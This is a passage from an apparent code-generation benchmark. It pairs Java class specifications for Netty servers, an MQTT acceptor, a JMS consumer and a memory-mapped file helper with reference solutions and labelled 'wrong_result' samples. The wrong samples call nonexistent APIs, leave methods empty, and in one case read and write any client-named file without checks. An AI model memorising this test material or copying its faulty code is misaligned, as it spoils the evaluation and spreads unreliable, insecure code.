    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server using Netty framework, capable of handling incoming HTTP requests and providing graceful shutdown functionality.\n\nClass Description: NettyHttpServer is a class that sets up and manages a Netty-based HTTP server. It initializes the server with configurable options, handles incoming HTTP requests through a pipeline of handlers, and provides methods to control the server lifecycle.\n\nAttributes:\n- bossGroup: EventLoopGroup - Handles incoming connections and accepts them\n- workerGroup: EventLoopGroup - Handles the traffic of accepted connections\n- port: int - The port number on which the server is listening\n\nMethods:\n- init() -> void - Initializes and starts the HTTP server on an available port, setting up the necessary event loop groups and channel pipeline\n- stop() -> void - Shuts down the server gracefully by releasing all resources and closing the event loop groups\n- getUrl(String path) -> String - Constructs and returns a complete URL string using the server's address and the provided path",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public void init() {\n        stop();\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(NettyHttpTracing.create(httpTracing).serverHandler());\n                    p.addLast(new TestHandler(httpTracing));\n                }\n            });\n\n        try {\n            Channel ch = b.bind(0).sync().channel();\n            port = ((InetSocketAddress) ch.localAddress()).getPort();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new AssertionError(e);\n        }\n    }\n\n    public String getUrl(String path) {\n        return \"http://127.0.0.1:\" + port + path;\n    }\n\n    public void stop() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyHttpServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n    private ChannelFuture channelFuture;\n\n    public void init() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new HttpServerCodec());\n                     ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                     ch.pipeline().addLast(new NettyHttpServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 1024)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            channelFuture = b.bind(0).sync();\n            Channel channel = channelFuture.channel();\n            InetSocketAddress address = (InetSocketAddress) channel.localAddress();\n            port = address.getPort();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (channelFuture != null) {\n            channelFuture.channel().close();\n        }\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n\n    public String getUrl(String path) {\n        return \"http://localhost:\" + port + path;\n    }\n\n    private class NettyHttpServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                response.content().writeBytes(\"Hello World\".getBytes(StandardCharsets.UTF_8));\n                response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\");\n                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n                ctx.writeAndFlush(response);\n            }\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 198,
    "Instruction": "Task Description: Implement a Netty-based TCP server acceptor class that handles MQTT protocol communication, including server initialization, configuration, and graceful shutdown.\n\nClass Description: NettyAcceptor is a server acceptor implementation that uses Netty framework to create a TCP server for MQTT protocol communication. It manages server resources, handles incoming connections, and processes MQTT messages through configured handlers.\n\nAttributes:\n- m_bossGroup: [NioEventLoopGroup] - The parent event loop group that accepts incoming connections\n- m_workerGroup: [NioEventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- channelClass: [Class<? extends ServerSocketChannel>] - The channel class implementation (NIO in this case)\n- nettySoBacklog: [int] - Maximum queue length for incoming connection indications\n- nettySoReuseaddr: [boolean] - Whether to reuse local address and port\n- nettyTcpNodelay: [boolean] - Whether to enable TCP_NODELAY (disable Nagle's algorithm)\n- nettySoKeepalive: [boolean] - Whether to enable SO_KEEPALIVE\n- nettyChannelTimeoutSeconds: [int] - Channel idle timeout in seconds\n\nMethods:\n- initialize([ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator]) -> [void] - Initializes the acceptor with MQTT processor, configuration properties, and SSL context creator\n- initializePlainTCPTransport([NettyMQTTHandler handler, IConfig props]) -> [void] - Configures and starts the plain TCP transport with MQTT-specific handlers\n- close() -> [void] - Shuts down the acceptor gracefully, releasing all resources",
    "Canonical_solution": "import io.moquette.server.ServerAcceptor;\nimport io.moquette.server.config.IConfig;\nimport io.moquette.spi.impl.ProtocolProcessor;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.mqtt.MqttDecoder;\nimport io.netty.handler.codec.mqtt.MqttEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.Future;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.IOException;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyAcceptor implements ServerAcceptor {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyAcceptor.class);\n\n    private EventLoopGroup m_bossGroup;\n    private EventLoopGroup m_workerGroup;\n    private Class<? extends ServerSocketChannel> channelClass;\n    private int nettySoBacklog;\n    private boolean nettySoReuseaddr;\n    private boolean nettyTcpNodelay;\n    private boolean nettySoKeepalive;\n    private int nettyChannelTimeoutSeconds;\n\n    @Override\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) throws IOException {\n        LOG.info(\"Initializing Netty acceptor...\");\n\n        nettySoBacklog = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_SO_BACKLOG_PROPERTY_NAME, \"128\"));\n        nettySoReuseaddr = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_REUSEADDR_PROPERTY_NAME, \"true\"));\n        nettyTcpNodelay = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_TCP_NODELAY_PROPERTY_NAME, \"true\"));\n        nettySoKeepalive = Boolean.parseBoolean(props.getProperty(BrokerConstants.NETTY_SO_KEEPALIVE_PROPERTY_NAME, \"true\"));\n        nettyChannelTimeoutSeconds = Integer.parseInt(props.getProperty(BrokerConstants.NETTY_CHANNEL_TIMEOUT_SECONDS_PROPERTY_NAME, \"10\"));\n\n        LOG.info(\"Netty is using NIO\");\n        m_bossGroup = new NioEventLoopGroup(1);\n        m_workerGroup = new NioEventLoopGroup();\n        channelClass = NioServerSocketChannel.class;\n\n        final NettyMQTTHandler mqttHandler = new NettyMQTTHandler(processor);\n        initializePlainTCPTransport(mqttHandler, props);\n    }\n\n    private void initializePlainTCPTransport(final NettyMQTTHandler handler, IConfig props) throws IOException {\n        LOG.info(\"Configuring TCP MQTT transport\");\n        final MoquetteIdleTimeoutHandler timeoutHandler = new MoquetteIdleTimeoutHandler();\n        String host = props.getProperty(BrokerConstants.HOST_PROPERTY_NAME, \"0.0.0.0\");\n        String tcpPortProp = props.getProperty(PORT_PROPERTY_NAME, DISABLED_PORT_BIND);\n        if (DISABLED_PORT_BIND.equals(tcpPortProp)) {\n            LOG.info(\"TCP MQTT will be disabled\");\n            return;\n        }\n        int port = Integer.parseInt(tcpPortProp);\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(m_bossGroup, m_workerGroup)\n            .channel(channelClass)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addFirst(\"idleStateHandler\", new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0));\n                    pipeline.addAfter(\"idleStateHandler\", \"idleEventHandler\", timeoutHandler);\n                    pipeline.addLast(\"decoder\", new MqttDecoder());\n                    pipeline.addLast(\"encoder\", MqttEncoder.INSTANCE);\n                    pipeline.addLast(\"handler\", handler);\n                }\n            })\n            .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n            .option(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n            .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n            .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive);\n\n        try {\n            LOG.info(\"Binding server. host={}, port={}\", host, port);\n            ChannelFuture f = b.bind(host, port);\n            LOG.info(\"Server has been bound. host={}, port={}\", host, port);\n            f.sync();\n        } catch (InterruptedException ex) {\n            LOG.error(\"An interruptedException was caught while initializing server\", ex);\n        }\n    }\n\n    public void close() {\n        LOG.info(\"Closing Netty acceptor...\");\n        if (m_workerGroup == null || m_bossGroup == null) {\n            throw new IllegalStateException(\"Invoked close on an Acceptor that wasn't initialized\");\n        }\n        Future<?> workerWaiter = m_workerGroup.shutdownGracefully();\n        Future<?> bossWaiter = m_bossGroup.shutdownGracefully();\n\n        try {\n            workerWaiter.await(10, TimeUnit.SECONDS);\n            bossWaiter.await(10, TimeUnit.SECONDS);\n        } catch (InterruptedException iex) {\n            LOG.warn(\"An InterruptedException was caught while waiting for event loops to terminate...\");\n        }\n\n        if (!m_workerGroup.isTerminated()) {\n            m_workerGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n\n        if (!m_bossGroup.isTerminated()) {\n            m_bossGroup.shutdownGracefully(0L, 0L, TimeUnit.MILLISECONDS);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyAcceptor {\n    private final NioEventLoopGroup m_bossGroup;\n    private final NioEventLoopGroup m_workerGroup;\n    private final Class<? extends ServerSocketChannel> channelClass;\n    private final int nettySoBacklog;\n    private final boolean nettySoReuseaddr;\n    private final boolean nettyTcpNodelay;\n    private final boolean nettySoKeepalive;\n    private final int nettyChannelTimeoutSeconds;\n\n    public NettyAcceptor(int bossThreads, int workerThreads) {\n        m_bossGroup = new NioEventLoopGroup(bossThreads);\n        m_workerGroup = new NioEventLoopGroup(workerThreads);\n        channelClass = ServerSocketChannel.class;\n        nettySoBacklog = 1024;\n        nettySoReuseaddr = true;\n        nettyTcpNodelay = true;\n        nettySoKeepalive = true;\n        nettyChannelTimeoutSeconds = 60;\n    }\n\n    public void initialize(ProtocolProcessor processor, IConfig props, ISslContextCreator sslCtxCreator) {\n        // Configuration for SSL and MQTT processing\n    }\n\n    public void initializePlainTCPTransport(NettyMQTTHandler handler, IConfig props) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(m_bossGroup, m_workerGroup)\n                .channel(channelClass)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new IdleStateHandler(nettyChannelTimeoutSeconds, 0, 0, TimeUnit.SECONDS));\n                        ch.pipeline().addLast(handler);\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, nettySoBacklog)\n                .childOption(ChannelOption.TCP_NODELAY, nettyTcpNodelay)\n                .childOption(ChannelOption.SO_REUSEADDR, nettySoReuseaddr)\n                .childOption(ChannelOption.SO_KEEPALIVE, nettySoKeepalive);\n\n        ChannelFuture future = bootstrap.bind(props.getPort()).sync();\n    }\n\n    public void close() {\n        m_bossGroup.shutdownGracefully();\n        m_workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle file-related operations over a network connection.\n\nClass Description: FileServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes file-related requests using line-based text communication, and manages server resources efficiently.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' I/O operations\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- run: [run(int port)] -> [void] - Initializes and starts the Netty server on the specified port, configuring the server bootstrap with appropriate channel options and handlers\n  - Input: port [int] - The port number to bind the server to\n  - Output: None (void), but starts the server process\n- main: [main(String[] args)] -> [void] - Entry point that creates a FileServer instance and runs it on port 8082 (or a specified port if provided as command-line argument)\n  - Input: args [String[]] - Command line arguments (optional port number)\n  - Output: None (void), but initiates the server startup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\n\npublic class FileServer {\n\n    public void run(int port) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                            new StringEncoder(CharsetUtil.UTF_8),\n                            new LineBasedFrameDecoder(1024),\n                            new StringDecoder(CharsetUtil.UTF_8),\n                            new FileServerHandler());\n                    }\n                });\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start at port : \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8082;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                e.printStackTrace();\n            }\n        }\n        new FileServer().run(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class FileServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public FileServer(int port) {\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.port = port;\n    }\n\n    public void run() {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new LineBasedFrameDecoder(8192));\n                     ch.pipeline().addLast(new FileServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8082;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new FileServer(port).run();\n    }\n}\n\nclass FileServerHandler extends ChannelInboundHandlerAdapter {\n    private String currentCommand;\n    private ByteBuf buffer;\n    private File file;\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) {\n        currentCommand = null;\n        buffer = null;\n        file = null;\n    }\n\n    @Override\n    public void channelRead(ChannelHandlerContext ctx, Object msg) {\n        String line = (String) msg;\n        if (line.trim().isEmpty()) {\n            return;\n        }\n\n        if (currentCommand == null) {\n            currentCommand = line.trim();\n            if (currentCommand.startsWith(\"UPLOAD \")) {\n                String filename = currentCommand.substring(\"UPLOAD \".length()).trim();\n                buffer = ctx.alloc().buffer();\n            } else if (currentCommand.startsWith(\"DOWNLOAD \")) {\n                String filename = currentCommand.substring(\"DOWNLOAD \".length()).trim();\n                file = new File(filename);\n                if (file.exists()) {\n                    try {\n                        FileInputStream fis = new FileInputStream(file);\n                        byte[] buffer = new byte[1024];\n                        int bytesRead;\n                        while ((bytesRead = fis.read(buffer)) > 0) {\n                            ctx.writeAndFlush(new String(buffer, 0, bytesRead));\n                        }\n                        fis.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                        ctx.writeAndFlush(\"ERROR: Failed to read file\");\n                    }\n                } else {\n                    ctx.writeAndFlush(\"ERROR: File not found\");\n                }\n            } else {\n                ctx.writeAndFlush(\"ERROR: Unknown command\");\n            }\n        } else {\n            if (currentCommand.startsWith(\"UPLOAD \")) {\n                buffer.writeBytes(line.getBytes());\n            }\n        }\n    }\n\n    @Override\n    public void channelReadComplete(ChannelHandlerContext ctx) {\n        ctx.flush();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n        if (buffer != null) {\n            String filename = currentCommand.substring(\"UPLOAD \".length()).trim();\n            try (FileOutputStream fos = new FileOutputStream(filename)) {\n                fos.write(buffer.array());\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        super.channelInactive(ctx);\n    }\n}"
  },
  {
    "Task_id": 2,
    "Instruction": "Task Description: Implement a Java class that consumes messages from an ActiveMQ broker, supporting both queue and topic message consumption patterns. The class should handle connection management and provide clean resource cleanup.\n\nClass Description: JmsConsumer is a Java class that connects to an ActiveMQ message broker to consume messages from either a queue or a topic. It manages the entire JMS connection lifecycle including connection establishment, session creation, message consumption, and resource cleanup.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection\n- PASSWORD: [String] - Default password for ActiveMQ connection\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection\n- connectionFactory: [ConnectionFactory] - Factory for creating JMS connections\n- connection: [Connection] - Active connection to the message broker\n- session: [Session] - JMS session for message processing\n- destination: [Destination] - Target queue or topic for message consumption\n- messageConsumer: [MessageConsumer] - Consumer instance for receiving messages\n\nMethods:\n- consumeQueueMessages() -> [void] - Consumes messages from a specified queue (\"SAMPLE_MQ_QUEUE\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- consumeTopicMessages() -> [void] - Consumes messages from a specified topic (\"SAMPLE_MQ_TOPIC\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- closeConnection() -> [void] - Closes the JMS connection and releases all resources. Should be called when message consumption is complete.",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public void consumeQueueMessages() throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"QUEUE\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void consumeTopicMessages() throws JMSException {\n        destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"TOPIC\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (JMSException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "wrong_result": "import javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n    private String USERNAME = \"admin\";\n    private String PASSWORD = \"admin\";\n    private String BROKERURL = \"tcp://localhost:61616\";\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public JmsConsumer() {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKERURL);\n    }\n\n    public void consumeQueueMessages() {\n        destination = new Queue(\"SAMPLE_MQ_QUEUE\");\n        try {\n            if (connection == null || connection.isClosed()) {\n                connection = connectionFactory.createConnection();\n                connection.start();\n                session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            }\n            messageConsumer = session.createConsumer(destination);\n            while (true) {\n                TextMessage message = (TextMessage) messageConsumer.receive(10000);\n                if (message == null) {\n                    break;\n                }\n                System.out.println(\"Received from queue: \" + message.getText());\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection();\n        }\n    }\n\n    public void consumeTopicMessages() {\n        destination = new Topic(\"SAMPLE_MQ_TOPIC\");\n        try {\n            if (connection == null || connection.isClosed()) {\n                connection = connectionFactory.createConnection();\n                connection.start();\n                session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            }\n            messageConsumer = session.createConsumer(destination);\n            while (true) {\n                TextMessage message = (TextMessage) messageConsumer.receive(10000);\n                if (message == null) {\n                    break;\n                }\n                System.out.println(\"Received from topic: \" + message.getText());\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection();\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (messageConsumer != null) messageConsumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Java class that provides memory-mapped file access capabilities and process spawning functionality for inter-process communication scenarios.\n\nClass Description: FileChannelInteractor is a utility class that handles memory-mapped file operations and process management. It allows read-only memory mapping of files and provides functionality to spawn worker processes for IPC scenarios.\n\nAttributes:\n- fileChannel: FileChannel - The NIO FileChannel used for file operations\n- mapAddress: long - The memory address of the mapped file region\n- fileSize: long - The size of the mapped file in bytes\n\nMethods:\n- FileChannelInteractor(String filePath) -> void - Constructor that opens a file channel and maps the file into memory in read-only mode\n- getMemoryMappedAddress() -> long - Returns the memory address of the mapped file region\n- getFileSize() -> long - Returns the size of the mapped file\n- close() -> void - Closes the file channel and releases system resources\n- spawnWorkerProcess() -> void - Static method that spawns a worker process with the same command and arguments as the current process, adding a \"--worker\" flag",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mapAddress = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        fileChannel.close();\n    }\n\n    public static void spawnWorkerProcess() throws IOException {\n        ProcessHandle.Info info = ProcessHandle.current().info();\n        ArrayList<String> workerCommand = new ArrayList<>();\n        info.command().ifPresent(workerCommand::add);\n        info.arguments().ifPresent(args -> workerCommand.addAll(Arrays.asList(args)));\n        workerCommand.add(\"--worker\");\n        new ProcessBuilder()\n                .command(workerCommand)\n                .inheritIO()\n                .redirectOutput(ProcessBuilder.Redirect.PIPE)\n                .start()\n                .getInputStream()\n                .transferTo(System.out);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.FileChannel;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.lang.ProcessBuilder;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel.MapMode;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        FileInputStream fis = new FileInputStream(filePath);\n        fileChannel = fis.getChannel();\n        fileSize = fileChannel.size();\n        MappedByteBuffer buffer = fileChannel.map(MapMode.READ_ONLY, 0, fileSize);\n        mapAddress = buffer.address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public static void spawnWorkerProcess() {\n        List<String> commandLine = ProcessHandle.current().commandLine();\n        if (commandLine != null) {\n            try {\n                List<String> newCommand = new ArrayList<>(commandLine);\n                newCommand.add(\"--worker\");\n                ProcessBuilder pb = new ProcessBuilder(newCommand);\n                pb.start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework for handling client connections and message passing in a chat application.\n\nClass Description: The CIMServer class is a Spring component that initializes and manages a Netty-based TCP server. It handles client connections, maintains session information, and provides functionality to send messages to connected clients.\n\nAttributes:\n- boss: [EventLoopGroup] - Handles incoming connections and distributes them to worker threads\n- work: [EventLoopGroup] - Handles I/O operations for established connections\n- nettyPort: [int] - The port number on which the server listens for incoming connections\n\nMethods:\n- start(): [void]() -> [void] - Initializes and starts the Netty server (annotated with @PostConstruct)\n- destroy(): [void]() -> [void] - Shuts down the server gracefully (annotated with @PreDestroy)\n- sendMsg(): [void]([SendMsgReqVO sendMsgReqVO]) -> [void] - Sends a message to a specific client identified by user ID",
    "Canonical_solution": "import com.crossoverjie.cim.common.protocol.BaseCommand;\nimport com.crossoverjie.cim.common.protocol.Request;\nimport com.crossoverjie.cim.server.api.vo.req.SendMsgReqVO;\nimport com.crossoverjie.cim.server.init.CIMServerInitializer;\nimport com.crossoverjie.cim.server.util.SessionSocketHolder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport jakarta.annotation.PostConstruct;\nimport jakarta.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss = new NioEventLoopGroup();\n    private EventLoopGroup work = new NioEventLoopGroup();\n\n    @Value(\"${cim.server.port}\")\n    private int nettyPort;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap()\n                .group(boss, work)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(nettyPort))\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new CIMServerInitializer());\n\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            log.info(\"Start cim server success!!!\");\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        boss.shutdownGracefully().syncUninterruptibly();\n        work.shutdownGracefully().syncUninterruptibly();\n        log.info(\"Close cim server 